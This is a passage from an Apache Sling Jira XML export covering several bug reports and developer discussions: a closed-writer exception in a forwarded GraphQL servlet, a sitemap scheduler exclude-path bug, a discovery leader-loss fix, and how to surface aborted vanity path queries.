at com.adobe.aem.graphql.sites.adapters.sling.SlingGraphQLForwardingServlet.forwardRequest(SlingGraphQLForwardingServlet.java:80) &lt;span class=&quot;error&quot;&gt;&amp;#91;com.adobe.aem.graphql.sling-adapter:0.1.42&amp;#93;&lt;/span&gt;&lt;br/&gt;
at com.adobe.aem.graphql.sites.adapters.sling.SlingGraphQLForwardingServlet.doPost(SlingGraphQLForwardingServlet.java:67) &lt;span class=&quot;error&quot;&gt;&amp;#91;com.adobe.aem.graphql.sling-adapter:0.1.42&amp;#93;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;It does not affect the output but it is pretty noisy.&lt;/p&gt;</comment>
                            <comment id="17597957" author="radu.cotescu" created="Tue, 30 Aug 2022 15:57:15 +0000"  >&lt;p&gt;As mentioned in the PR, this should be fixed in the Sling Engine - &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-graphql-core/pull/29#issuecomment-1193972633&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-graphql-core/pull/29#issuecomment-1193972633&lt;/a&gt;.&lt;/p&gt;</comment>
                            <comment id="17634524" author="schaefa" created="Tue, 15 Nov 2022 21:00:00 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=radu&quot; class=&quot;user-hover&quot; rel=&quot;radu&quot;&gt;radu&lt;/a&gt;&#160;Do you know if anything was done regarding this issue?&lt;/p&gt;

&lt;p&gt;I think the discussion you mentioned is not related to this issue as this is a problem because the Servlet Writer is closed because of the Json Writer leaving the try block and so specific to the GraphQL Servlet.&#160;&lt;/p&gt;</comment>
                            <comment id="17634573" author="schaefa" created="Tue, 15 Nov 2022 23:15:33 +0000"  >&lt;p&gt;The problem here is that the Johnzon&apos;s JsonWriter is closing the enclosed Servlet Print Writer which then will cause the WriterAlreadyClosedException when the Rewriter Response wants to flush the Print Writer.&lt;br/&gt;
If we would not use the JsonWriter we would not have this issue because the PrintWriter is not bound to the try-block.&#160;&lt;/p&gt;</comment>
                            <comment id="17636659" author="radu.cotescu" created="Mon, 21 Nov 2022 12:10:38 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=andysch&quot; class=&quot;user-hover&quot; rel=&quot;andysch&quot;&gt;andysch&lt;/a&gt;, no, I didn&apos;t have the time to start a PR for the issue mentioned in &lt;a href=&quot;https://lists.apache.org/thread/lytsl0b23d56xkmvsvnoxm4d7skxcq5h&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://lists.apache.org/thread/lytsl0b23d56xkmvsvnoxm4d7skxcq5h&lt;/a&gt; (comment to your original PR).&lt;/p&gt;

&lt;p&gt;But like &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt; already suggested, we should not skip calling the original &lt;tt&gt;close&lt;/tt&gt; method, since it might do more than just closing the writer. Again, we should fix the chain of calls we see in the stack trace you posted.&lt;/p&gt;</comment>
                            <comment id="17637398" author="schaefa" created="Tue, 22 Nov 2022 18:13:15 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=radu&quot; class=&quot;user-hover&quot; rel=&quot;radu&quot;&gt;radu&lt;/a&gt;&#160;I don&apos;t mind fixing the issue upstream or does not throw an exception when someone calls flush / close on an already closed writer. That said I don&apos;t understand why the writer needs to be closed in the GraphQLServlet? This was not happening before.&lt;br/&gt;
Is there a reason why the Servlet Writer needs to be closed? Otherwise we should keep the Writer open.&lt;/p&gt;</comment>
                            <comment id="17754130" author="radu.cotescu" created="Mon, 14 Aug 2023 14:52:04 +0000"  >&lt;p&gt;Circling back to this issue.&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;Is there a reason why the Servlet Writer needs to be closed?&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Yes, the GraphQL servlet is the one that controls the execution. What&apos;s the point of having the writer open after the GraphQL execution result has been sent?&lt;/p&gt;</comment>
                            <comment id="17754179" author="schaefa" created="Mon, 14 Aug 2023 16:46:53 +0000"  >&lt;p&gt;The Servlet Writer should not be closed inside the GraphQL Servlet as it was originally.&lt;/p&gt;

&lt;p&gt;Because the GraphQL Servlet is used with a redirect and when it is closed prematurely the calling servlet is causing an exception (as mentioned in the ticket) that the writer was already closed. The fix could also be that there is not exception raised when the writer is closed again which it should if you asked me but that is not how it works right now.&lt;/p&gt;</comment>
                            <comment id="17754497" author="radu.cotescu" created="Tue, 15 Aug 2023 08:56:07 +0000"  >&lt;p&gt;The GraphQL Servlet doesn&apos;t do anything wrong. The error mentioned in this issue can happen when requests are forwarded to the GraphQL servlet and the actual cause is described in &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-12003&quot; title=&quot;The RequestDispatcher should flush the buffer on forward only if the buffer hasn&amp;#39;t already been closed&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-12003&quot;&gt;&lt;del&gt;SLING-12003&lt;/del&gt;&lt;/a&gt;.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10020">
                    <name>Cloners</name>
                                            <outwardlinks description="is a clone of">
                                        <issuelink>
            <issuekey id="13320839">SLING-9626</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                            <outwardlinks description="relates to">
                                        <issuelink>
            <issuekey id="13547354">SLING-12003</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 10 weeks, 2 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z16wpk:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11451] SitemapScheduler does not schedule sitemap generation for excludePaths with empty entry</title>
                <link>https://issues.apache.org/jira/browse/SLING-11451</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;When a SitemapScheduler configuration is created using the felix web console the excludePaths configuration property gets stored with a single empty entry.&#160;&lt;/p&gt;

&lt;p&gt;This causes the exclude path set to match all paths and prevents the SitemapScheduler to schedule any sitemap generation.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13471427">SLING-11451</key>
            <summary>SitemapScheduler does not schedule sitemap generation for excludePaths with empty entry</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="1" iconUrl="https://issues.apache.org/jira/images/icons/statuses/open.png" description="The issue is open and ready for the assignee to start work on it.">Open</status>
                    <statusCategory id="2" key="new" colorName="blue-gray"/>
                                    <resolution id="-1">Unresolved</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="diru">Dirk Rudolph</reporter>
                        <labels>
                            <label>good-first-issue</label>
                            <label>sitemaps</label>
                    </labels>
                <created>Wed, 13 Jul 2022 14:40:21 +0000</created>
                <updated>Fri, 17 Oct 2025 13:43:06 +0000</updated>
                                            <version>Sitemap 1.0.6</version>
                                                    <component>Extensions</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                        <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 15 weeks ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z16u4g:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11450] Partially started instance suppression can lead to unwanted leader loss</title>
                <link>https://issues.apache.org/jira/browse/SLING-11450</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-10489&quot; title=&quot;Ignore partially started, newly joining instances to avoid disturbing discovery (for a while)&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-10489&quot;&gt;&lt;del&gt;SLING-10489&lt;/del&gt;&lt;/a&gt; introduced &quot;partial startup suppression&quot; sometimes also referred to as &quot;joinerdelay&quot; (even though the latter is actually a subfeature of the former).&lt;/p&gt;

&lt;p&gt;With this suppression enabled (it is disabled by default), upon a topology change the leader instance can loose its leader status even though it did not actually leave the topology or crash. This is against the discovery API contract, which says that the leader stays leader until it crashes.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13471424">SLING-11450</key>
            <summary>Partially started instance suppression can lead to unwanted leader loss</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="stefanegli">Stefan Egli</assignee>
                                    <reporter username="stefanegli">Stefan Egli</reporter>
                        <labels>
                    </labels>
                <created>Wed, 13 Jul 2022 14:37:37 +0000</created>
                <updated>Wed, 3 Aug 2022 09:49:35 +0000</updated>
                            <resolved>Thu, 21 Jul 2022 14:08:59 +0000</resolved>
                                    <version>Discovery Base 2.0.12</version>
                    <version>Discovery Oak 1.2.36</version>
                                    <fixVersion>Discovery Base 2.0.14</fixVersion>
                    <fixVersion>Discovery Oak 1.2.38</fixVersion>
                                    <component>Discovery</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="12000">3h 20m</timespent>
                                <comments>
                            <comment id="17566352" author="egli" created="Wed, 13 Jul 2022 14:42:31 +0000"  >&lt;ul&gt;
	&lt;li&gt;simple test buglet fix in discovery.base in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-discovery-base/pull/9&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;this PR&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</comment>
                            <comment id="17566362" author="egli" created="Wed, 13 Jul 2022 14:49:35 +0000"  >&lt;ul&gt;
	&lt;li&gt;actual fix is in discovery.oak in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-discovery-oak/pull/7&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;this PR&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</comment>
                            <comment id="17569456" author="egli" created="Thu, 21 Jul 2022 14:08:48 +0000"  >&lt;ul&gt;
	&lt;li&gt;merged both PRs&lt;/li&gt;
	&lt;li&gt;releasing both bundles next&lt;/li&gt;
&lt;/ul&gt;
</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 13 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z16u3s:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11439] resource resolver: fails to detect aborted vanity path query</title>
                <link>https://issues.apache.org/jira/browse/SLING-11439</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;With the introduction of the Oak query limit, JCR queries may get aborted when the result set size exceeds a certain value (currently by default 100000).&lt;/p&gt;

&lt;p&gt;However:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-jcr-resource/blob/604332e9be17378276685033bdbce54994dad8c1/src/main/java/org/apache/sling/jcr/resource/internal/helper/jcr/JcrNodeResourceIterator.java#L115-L134&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-jcr-resource/blob/604332e9be17378276685033bdbce54994dad8c1/src/main/java/org/apache/sling/jcr/resource/internal/helper/jcr/JcrNodeResourceIterator.java#L115-L134&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;So Apache Sling JCR Resource&apos;s API hides that exception, and thus resource resolver will happily startup with an incomplete cache.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13470357">SLING-11439</key>
            <summary>resource resolver: fails to detect aborted vanity path query</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="1" iconUrl="https://issues.apache.org/jira/images/icons/statuses/open.png" description="The issue is open and ready for the assignee to start work on it.">Open</status>
                    <statusCategory id="2" key="new" colorName="blue-gray"/>
                                    <resolution id="-1">Unresolved</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="reschke">Julian Reschke</reporter>
                        <labels>
                    </labels>
                <created>Wed, 6 Jul 2022 13:31:30 +0000</created>
                <updated>Fri, 9 Sep 2022 11:25:00 +0000</updated>
                                                                            <component>ResourceResolver</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>4</watches>
                                                                                                                <comments>
                            <comment id="17563232" author="reschke" created="Wed, 6 Jul 2022 13:34:13 +0000"  >&lt;p&gt;I &lt;b&gt;believe&lt;/b&gt; we can only fix this on the Sling JCR Resource level, exposing the exception in some way.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=thomasm&quot; class=&quot;user-hover&quot; rel=&quot;thomasm&quot;&gt;thomasm&lt;/a&gt;, &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cziegeler&quot; class=&quot;user-hover&quot; rel=&quot;cziegeler&quot;&gt;cziegeler&lt;/a&gt;, &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=jhoh&quot; class=&quot;user-hover&quot; rel=&quot;jhoh&quot;&gt;jhoh&lt;/a&gt; - feedback appreciated.&lt;/p&gt;

&lt;p&gt;The alternative would be to use the JCR API directly, but that would have a significant effect on the unit tests that use mocked Sling objects.&lt;/p&gt;</comment>
                            <comment id="17563302" author="tmueller" created="Wed, 6 Jul 2022 15:32:58 +0000"  >&lt;p&gt;&amp;gt; exposing the exception in some way.&lt;/p&gt;

&lt;p&gt;For example, by throwing a RuntimeException.&lt;/p&gt;

&lt;p&gt;I don&apos;t have a strong opinion on this. Other than: it is important that the problem itself is fixed. The main problems, for me, are:&lt;/p&gt;
&lt;ul&gt;
	&lt;li&gt;It blocks startup for a long time.&lt;/li&gt;
	&lt;li&gt;It doesn&apos;t properly read all the entries.&lt;/li&gt;
&lt;/ul&gt;
</comment>
                            <comment id="17563578" author="cziegeler" created="Thu, 7 Jul 2022 05:16:27 +0000"  >&lt;p&gt;If the implementation (Oak) decides to have a limit, I think that is fine and must not result in propagating an exception when searching. In that sense, the quoted code seems to do the right thing.&lt;br/&gt;
Whether catching throwable is the right thing, is a different topic &lt;img class=&quot;emoticon&quot; src=&quot;https://issues.apache.org/jira/images/icons/emoticons/smile.png&quot; height=&quot;16&quot; width=&quot;16&quot; align=&quot;absmiddle&quot; alt=&quot;&quot; border=&quot;0&quot;/&gt;&lt;br/&gt;
For vanity path queries it is actually crucial to get all results, but I think the jcr resource implementation can&apos;t decide whether the call really needs all results or is fine with a limited set. So I think, we need to introduce something the caller can pass down in order to inform the (jcr) resource implementation&lt;/p&gt;</comment>
                            <comment id="17563666" author="reschke" created="Thu, 7 Jul 2022 10:14:29 +0000"  >&lt;p&gt;What worries me here is that we apparently have different answers depending on whether you use the JCR API (throws) and the Sling API (does not). I think this is highly confusing.&lt;/p&gt;</comment>
                            <comment id="17563736" author="cziegeler" created="Thu, 7 Jul 2022 11:42:16 +0000"  >&lt;p&gt;Changing this now in Sling will most likely break some clients and cause unnecessary trouble. So I think the only option is for clients to opt-in into this, for example by specifying some special tokens in the query string.&lt;/p&gt;</comment>
                            <comment id="17563739" author="reschke" created="Thu, 7 Jul 2022 11:44:55 +0000"  >&lt;p&gt;Adding tokens to the query string implies Sling parsing the string - not good, given we&apos;re talking about SQL, SQL2 and XPath,&lt;/p&gt;

&lt;p&gt;How about adding a param to findResources?&lt;/p&gt;</comment>
                            <comment id="17563740" author="cziegeler" created="Thu, 7 Jul 2022 11:47:37 +0000"  >&lt;p&gt;Any API change comes with a high cost as this usually requires dozens of updates across Sling and using products.&lt;br/&gt;
While I agree that its not nice if Sling needs to parse the string, we could just check if it ends with &quot;FOO&quot; and are done with it&lt;/p&gt;</comment>
                            <comment id="17563768" author="reschke" created="Thu, 7 Jul 2022 12:40:31 +0000"  >&lt;p&gt;(unpopular opinion&lt;img class=&quot;emoticon&quot; src=&quot;https://issues.apache.org/jira/images/icons/emoticons/smile.png&quot; height=&quot;16&quot; width=&quot;16&quot; align=&quot;absmiddle&quot; alt=&quot;&quot; border=&quot;0&quot;/&gt; a change to the query language syntax is an API change as well; just with less visibility.&lt;/p&gt;</comment>
                            <comment id="17563780" author="cziegeler" created="Thu, 7 Jul 2022 12:57:00 +0000"  >&lt;p&gt;I wouldn&apos;t call it unpopular opinion, and I totally agree that it is an API change, no doubt about it. But it is not altering java interfaces which would require us to do a minor version update of the package and then the pain begins.&lt;/p&gt;</comment>
                            <comment id="17563796" author="reschke" created="Thu, 7 Jul 2022 13:20:57 +0000"  >&lt;p&gt;Assuming we embed it into the query string - would you strip that information before passing it down to JCR? Would you support it for all query grammars supported by JCR?&lt;/p&gt;

&lt;p&gt;Changing the minor version number actually is good. It ensures that people who want correct vanity path behavior get it...&lt;/p&gt;</comment>
                            <comment id="17563809" author="kwin" created="Thu, 7 Jul 2022 14:16:47 +0000"  >&lt;p&gt;I am pretty much against such a hacky approach. Let us do it decently, overload the method &lt;tt&gt;ResourceResolver.findResource&lt;/tt&gt; and then change all provider implementations of &lt;tt&gt;ResourceResolver&lt;/tt&gt; That shouldn&apos;t be too many, and if it is we can even make the overloaded &lt;tt&gt;findResource&lt;/tt&gt; have a default implementation just calling the old method.&lt;/p&gt;</comment>
                            <comment id="17563813" author="cziegeler" created="Thu, 7 Jul 2022 14:26:34 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=reschke&quot; class=&quot;user-hover&quot; rel=&quot;reschke&quot;&gt;reschke&lt;/a&gt; Is there a real problem to be solved? My assumption is, this has been like this for ages, so why change it now? &lt;br/&gt;
For the vanity path/alias, isn&apos;t there an improvement in oak which will allow us to do paged queries which then solves the problem?&lt;/p&gt;</comment>
                            <comment id="17563833" author="tmueller" created="Thu, 7 Jul 2022 15:30:13 +0000"  >&lt;p&gt;I&apos;m fine with either approach (I don&apos;t have a strong opinion). If we want to support this case, but want to use the query string approach (that doesn&apos;t require a new Java API): one option would be to append something like &quot;/* throws */&quot; to the query - a bit similar to a Java method that throws. For example:&lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;public static final String ITERATOR_CAN_THROW = &quot;/* throws */&quot;

String query = &quot;select * from ... &quot; +
    &quot;order by ... &quot; + ITERATOR_CAN_THROW;
request.getResourceResolver().findResources(query, &quot;JCR-SQL2&quot;);
...
try {
} catch (...) {
    ...
}
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Really just an idea. I agree it&apos;s a bit unusual.&lt;/p&gt;</comment>
                            <comment id="17563914" author="reschke" created="Thu, 7 Jul 2022 18:03:26 +0000"  >&lt;blockquote&gt;&lt;p&gt;Is there a real problem to be solved? My assumption is, this has been like this for ages, so why change it now? &lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Has it been like that for ages? Didn&apos;t we just change the default setting a few months ago? (Yes, I may be confused about this)&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;For the vanity path/alias, isn&apos;t there an improvement in oak which will allow us to do paged queries which then solves the problem?&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Yes, but we still need to figure out (1) how to detect that this improvement is present, (2) and select a proper page size. Paging by default will make things more complicated; it would be much simpler to run the query as-is, detect that it was aborted, and run a new query starting at the last location. (To make things worse, we don&apos;t have a way to detect whether &lt;a href=&quot;https://issues.apache.org/jira/browse/OAK-9625&quot; class=&quot;external-link&quot; rel=&quot;nofollow&quot;&gt;https://issues.apache.org/jira/browse/OAK-9625&lt;/a&gt; is supported at runtime)&lt;/p&gt;

&lt;p&gt;(mumble - using the JCR API here would solve most of these issues)&lt;/p&gt;</comment>
                            <comment id="17564181" author="tmueller" created="Fri, 8 Jul 2022 09:20:46 +0000"  >&lt;p&gt;&amp;gt; (To make things worse, we don&apos;t have a way to detect whether &lt;a href=&quot;https://issues.apache.org/jira/browse/OAK-9625&quot; class=&quot;external-link&quot; rel=&quot;nofollow&quot;&gt;https://issues.apache.org/jira/browse/OAK-9625&lt;/a&gt; is supported at runtime)&lt;/p&gt;

&lt;p&gt;Well, it is quite easy to detect: You can just try to run this query, and if it fails with a syntax exception, run the old code, or a simpler query without &quot;jcr:first&quot;, for example:&lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;/jcr:root//element(*, nt:base)[@alias]
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;(Which might be the query that is used today.)&lt;/p&gt;</comment>
                            <comment id="17564190" author="tmueller" created="Fri, 8 Jul 2022 09:28:06 +0000"  >&lt;p&gt;&amp;gt; Paging by default will make things more complicated&lt;/p&gt;

&lt;p&gt;Yes, but I think that&apos;s just the price to pay for a modern API... With modern API, I mean an API that can works well in a remote setting. Returning a huge result set doesn&apos;t work well in a remote setting: it either requires state on the server side, or it requires a huge and slow response. Both it not good. Similar to web pages: they need to be returned quickly, and it&apos;s better if they don&apos;t require state on the server side. (Keyset pagination is state on the client side... that part is fine.)&lt;/p&gt;</comment>
                            <comment id="17564204" author="reschke" created="Fri, 8 Jul 2022 09:52:02 +0000"  >&lt;blockquote&gt;&lt;p&gt;You can just try to run this query, and if it fails with a syntax exception, run the old code&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Ah, will it indeed throw an exception? That&apos;s good.&lt;/p&gt;</comment>
                            <comment id="17564247" author="tmueller" created="Fri, 8 Jul 2022 11:48:20 +0000"  >&lt;p&gt;&amp;gt; will it indeed throw an exception?&lt;/p&gt;

&lt;p&gt;Well, Oak will throw an exception. I do hope that Sling doesn&apos;t swallow this exception and return an empty result set in this case... I don&apos;t know, but I would be surprised.&lt;/p&gt;</comment>
                            <comment id="17564251" author="reschke" created="Fri, 8 Jul 2022 12:01:32 +0000"  >&lt;p&gt;But how do I decide what a good page size would be? Do we have any real-world example of code using this feature yet?&lt;/p&gt;</comment>
